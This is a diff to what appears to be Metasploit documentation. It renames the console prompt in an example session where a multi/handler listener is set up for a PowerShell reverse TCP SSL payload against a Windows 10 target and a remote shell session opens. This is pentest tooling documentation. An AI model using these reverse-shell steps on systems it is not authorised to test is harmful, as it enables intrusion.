@@ -29,19 +29,19 @@ The output batch file can be executed directly on the target, or pasted as a com
 ### Example usage on Windows 10 target
 
 ```
-msf6 > use exploit/multi/handler
+msf > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp_ssl
+msf exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp_ssl
 payload => cmd/windows/powershell_reverse_tcp_ssl
-msf6 exploit(multi/handler) > set LHOST 192.168.0.2
+msf exploit(multi/handler) > set LHOST 192.168.0.2
 LHOST => 192.168.0.2
-msf6 exploit(multi/handler) > set LPORT 4444
+msf exploit(multi/handler) > set LPORT 4444
 LPORT => 4444
-msf6 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 [*] Started reverse SSL handler on 192.168.0.2:4444
 [*] Powershell session session 1 opened (192.168.0.2:4444 -> 192.168.0.2:49736 ) at 2021-11-02 13:01:28 +0000
 
-msf6 exploit(multi/handler) > sessions 1
+msf exploit(multi/handler) > sessions 1
 [*] Starting interaction with 1...
 
 User @ DESKTOP-5E3GRS6
